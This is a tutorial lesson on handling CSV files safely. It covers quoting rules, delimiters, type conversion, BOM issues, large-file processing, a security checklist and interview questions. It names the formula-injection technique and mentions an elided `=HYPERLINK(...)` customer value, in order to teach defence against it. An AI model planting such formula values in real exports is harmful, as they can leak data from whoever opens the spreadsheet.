<Tr>
<En>

- CSV = one row per line, comma-separated fields, usually a header.
- Never `split(",")`: quoted fields can hold commas, quotes and new lines.
- Quotes inside quoted fields are doubled; let a CSV writer do it.
- Delimiters vary (`,` `;` tab); set them explicitly for known sources.
- Everything is text: convert types yourself; keep IDs and phones as strings; `Decimal` for money; ISO dates.

<DeepDive title="Real world: the accountant's totals that didn't match">

A small e-commerce company exports orders to CSV every night for its accountant. One week the totals don't match the payment gateway. The cause: a customer typed the address `House 12, Street 4, Downtown`, and the export script built lines with `",".join(values)`, so every address with commas shifted the following columns and some **amounts** landed in the "city" column. The developer switched to `csv.writer`, added a test with commas, quotes and new lines in every text field, started writing amounts as plain numbers and dates as `YYYY-MM-DD`, and added the formula-injection sanitizer after a security review found a customer named `=HYPERLINK(...)`. The accountant now imports with **Data → From Text/CSV** with phone and order-ID columns set to Text, so leading zeros stop disappearing.

</DeepDive>

<DeepDive title="Security lens">

A CSV export is a document someone will open on their own computer. Treat every user-supplied cell as untrusted.

- **CSV/formula injection:** prefix text cells starting with `=`, `+`, `-`, `@`, tab or carriage return with `'`, and validate input.
- **Data leakage:** exports often contain far more personal data than needed. Export only required columns, protect download links (authentication, expiry), and keep CSVs out of public buckets and shared folders; exposed CSV backups cause many breaches.
- **Upload limits:** cap size and row count, and stream uploads, so a giant file can't exhaust memory.
- **Injection on import:** imported values reach databases and web pages; use parameterised SQL and escape HTML output.
- **Integrity:** for financial files, validate totals and checksums and keep the original for audit.
- **Encryption and retention:** CSVs with personal or financial data should be encrypted at rest and deleted when no longer needed.

</DeepDive>

<DeepDive title="Interview questions">

<QA q="Why shouldn't you parse CSV by splitting each line on commas?">
Fields may contain commas, double quotes or even line breaks when they are enclosed in double quotes, and quotes inside fields are escaped by doubling them. Splitting on commas or lines ignores these rules, so columns shift and records are broken. A proper CSV parser handles quoting, escaping, delimiters and multi-line fields correctly.
</QA>

<QA q="What are the quoting rules in RFC 4180?">
Fields are separated by commas and records by line breaks. A field containing a comma, a double quote or a line break must be enclosed in double quotes, and a double quote inside a quoted field is represented by two double quotes. A header line is optional, and every record should have the same number of fields.
</QA>

<QA q="What is CSV injection and how do you prevent it?">
CSV or formula injection happens when user-controlled data starting with characters such as equals, plus, minus or at is exported to CSV and then interpreted as a formula by a spreadsheet, which can exfiltrate data through links or trigger other harmful behaviour. Prevent it by prefixing such text cells with a single quote at export time, while keeping genuine numbers numeric, and by validating input.
</QA>

<QA q="What problems can a UTF-8 BOM cause with CSV files?">
Excel often writes a byte order mark at the start of UTF-8 CSV files. Programs that do not strip it read it as an invisible character at the beginning of the first column name, so lookups by that name fail even though the header looks correct. Reading with an encoding that removes the BOM, such as utf-8-sig in Python, solves this, while writing with a BOM helps Excel display non-ASCII text correctly.
</QA>

<QA q="How would you process a 10 GB CSV file?">
Stream it row by row instead of loading it into memory, aggregating results as you go, or process it in chunks with tools like pandas chunksize, DuckDB or Polars. For repeated analysis, load it into a database with a bulk loader such as PostgreSQL COPY or convert it to a columnar format such as Parquet.
</QA>
